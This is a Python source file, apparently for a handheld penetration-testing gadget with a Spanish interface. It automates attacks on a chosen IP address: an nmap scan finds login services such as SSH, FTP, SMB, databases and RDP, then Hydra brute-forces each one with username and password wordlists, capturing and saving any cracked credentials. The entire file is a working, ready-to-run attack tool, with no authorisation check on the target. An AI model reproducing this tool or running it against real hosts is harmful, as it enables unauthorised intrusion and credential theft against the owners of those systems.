#!/usr/bin/env python3
# /opt/beetle/tools/hydra/hydra_runner.py
import os
import time
import subprocess
import re
import signal
from display.screen import MenuDisplay
from config.gpio_config import read_buttons, REPEAT_DELAY
from tools.wifi.lan_scanner import is_wifi_client_connected


class HydraRunner:
    def __init__(self):
        self.display = MenuDisplay()
        self.report_dir = "/opt/beetle/reports/hydra"
        os.makedirs(self.report_dir, exist_ok=True)
        self.wordlist_user = "/usr/share/wordlists/username.txt"
        self.wordlist_pass = "/usr/share/wordlists/password.txt"
        
        self.success_pattern = re.compile(
            r'\[\+\]\s+.*(?:login|user|username):\s*(\S+).*password:\s*(\S+)', 
            re.IGNORECASE
        )

    def _input_ip(self) -> str:
        self.display.show_message(["Ingresa IP", "Objetivo:"], center=True)
        time.sleep(1.5)
     
        from menus.utils_menu import UtilsMenu
        utils = UtilsMenu()
        ip = utils.qwerty_input("IP")
        return ip.strip() if ip and ip.strip() else None

    def _scan_services(self, target_ip: str):
        self.display.show_message(["Escaneando...", target_ip], center=True)
     
        common_ports = "21,22,23,25,53,110,139,143,445,1433,3306,5432,5900,8081,21-23,445"
     
        try:
            cmd = [
                "sudo", "nmap", "-p", common_ports, "--open",
                "-sV", "-T4", "--min-rate", "400", "-n", "-Pn", target_ip
            ]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  text=True, timeout=75)
            output = result.stdout + result.stderr
            services = []
            for line in output.splitlines():
                line = line.strip()
                if "/tcp" in line and "open" in line:
                    match = re.search(r'(\d+)/tcp\s+open\s+([^\s]+)(?:\s+(.*))?', line)
                    if match:
                        port = match.group(1)
                        svc = match.group(2).lower().strip()
                        extra = (match.group(3) or "").lower()
                     
                        if any(x in svc or x in extra for x in ['http', 'https', 'ssl/http', 'www']):
                            continue
                     
                        service_map = {
                            'ftp': 'ftp', 'ssh': 'ssh', 'telnet': 'telnet',
                            'smtp': 'smtp', 'pop3': 'pop3', 'imap': 'imap',
                            'microsoft-ds': 'smb', 'netbios-ssn': 'smb',
                            'mysql': 'mysql', 'postgresql': 'postgres',
                            'ms-sql-s': 'mssql', 'rdp': 'rdp'
                        }
                        service_name = service_map.get(svc, svc)
                        if service_name:
                            services.append((port, service_name))
         
            seen = set()
            unique = []
            for p, s in services:
                key = (p, s)
                if key not in seen:
                    seen.add(key)
                    unique.append((p, s))
         
            return unique[:10]
         
        except subprocess.TimeoutExpired:
            self.display.show_message(["Timeout en scan"], center=True)
            time.sleep(1.5)
            return []
        except Exception as e:
            self.display.show_message(["Error scan:", str(e)[:12]], center=True)
            time.sleep(1.5)
            return []

    def _wrap_text(self, text: str, width: int = 20) -> str:
        lines = []
        for paragraph in text.split('\n'):
            if not paragraph.strip():
                lines.append('')
                continue
                
            words = paragraph.split()
            if not words:
                continue
                
            current_line = words[0]
            for word in words[1:]:
                if len(current_line) + len(word) + 1 <= width:
                    current_line += ' ' + word
                else:
                    lines.append(current_line)
                    current_line = word
            lines.append(current_line)
        return '\n'.join(lines)

    def _format_report_file(self, report_file: str):
        if not os.path.exists(report_file):
            return
            
        try:
            with open(report_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            
            formatted = self._wrap_text(content, width=20)
            
            with open(report_file, "w", encoding="utf-8") as f:
                f.write(formatted)
                
        except Exception as e:
            print(f"Error formateando reporte: {e}")

    def _run_hydra(self, target_ip: str, service: str, port: str):
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_file = os.path.join(self.report_dir, f"hydra_{service}_{target_ip}_{timestamp}.txt")
     
        self.display.show_message(["Brute Force", f"{service.upper()}", f"{target_ip}:{port}"], center=True)
        time.sleep(1)

        cmd = [
            "sudo", "hydra", "-L", self.wordlist_user, "-P", self.wordlist_pass,
            "-t", "6", "-vV", "-f", "-o", report_file, target_ip, service
        ]
        if port and port != "default":
            cmd.extend(["-s", port])

        proc = None
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                  text=True, preexec_fn=os.setsid)

            success_found = False

            for line in iter(proc.stdout.readline, ''):
                if not line:
                    break
                stripped = line.strip()
                if not stripped or len(stripped) < 6:
                    continue

                lower = stripped.lower()

                if any(k in lower for k in ["login", "password", "found", "host", "attempt"]):
                    max_line_len = 21
                    parts = []
                    remaining = stripped
                    while remaining and len(parts) < 4:
                        if len(remaining) <= max_line_len:
                            parts.append(remaining)
                            break
                        split_point = remaining[:max_line_len].rfind(' ')
                        if split_point > 8:
                            parts.append(remaining[:split_point])
                            remaining = remaining[split_point:].strip()
                        else:
                            parts.append(remaining[:max_line_len])
                            remaining = remaining[max_line_len:].strip()
                    self.display.show_message(parts, center=False)

                match = self.success_pattern.search(stripped)
                if match or any(x in lower for x in ["[+]", "password found", "successful login"]):
                    user = match.group(1) if match else "Encontrado"
                    self.display.show_message(["¡SUCCESS!", f"{service.upper()}"], center=True)
                    time.sleep(1.8)
                    success_found = True
                    try:
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    except:
                        try:
                            proc.kill()
                        except:
                            pass
                    break

                time.sleep(0.07)

            if proc.poll() is None:
                try:
                    proc.wait(timeout=10)
                except:
                    proc.kill()

            if os.path.exists(report_file):
                self._format_report_file(report_file)

            if os.path.getsize(report_file) > 100:
                with open(report_file, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    if self.success_pattern.search(content) or "[+]" in content:
                        self.display.show_message(["¡EXITOS!"], center=True)
                        time.sleep(1.8)
                        return report_file

            self.display.show_message(["Ver Reportes..."], center=True)
            time.sleep(1.5)
            return report_file
         
        except Exception as e:
            self.display.show_message(["Error Hydra", str(e)[:15]], center=True)
            time.sleep(1.5)
            return None
        finally:
            if proc and proc.poll() is None:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except:
                    pass 

    def run(self):
        if not is_wifi_client_connected():
            self.display.show_message(["Necesitas estar", "conectado a WiFi"], center=True)
            time.sleep(1.5)
            return
        target_ip = self._input_ip()
        if not target_ip or len(target_ip.split('.')) != 4:
            self.display.show_message(["IP Inválida"], center=True)
            time.sleep(1.5)
            return
        services = self._scan_services(target_ip)
        if not services:
            self.display.show_message(["Sin Servicios", "Para", "Brute Force"], center=True)
            time.sleep(1.5)
            return
        self.display.show_message(["Servicios", "Encontrados", f"{len(services)}"], center=True)
        time.sleep(1.5)
        for port, service in services:
            btn = read_buttons()
            if btn.get("enter"):
                time.sleep(1)
                break
            self._run_hydra(target_ip, service, port)
        self.display.show_message(["HYDRA", "FINALIZADO"], center=True)
        time.sleep(1.5)
        
